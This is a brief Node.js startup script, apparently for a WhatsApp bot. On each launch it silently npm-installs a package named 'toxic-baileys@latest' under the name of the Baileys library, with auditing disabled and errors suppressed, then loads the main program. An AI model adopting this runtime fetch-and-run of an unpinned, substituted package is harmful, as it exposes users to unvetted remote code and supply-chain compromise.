const { execSync } = require('child_process');

    try {
        execSync(
            'npm install @whiskeysockets/baileys@npm:toxic-baileys@latest --no-audit --no-fund --prefer-online --legacy-peer-deps',
            { cwd: __dirname, stdio: 'inherit' }
        );
    } catch (e) {}

    require('./index');
    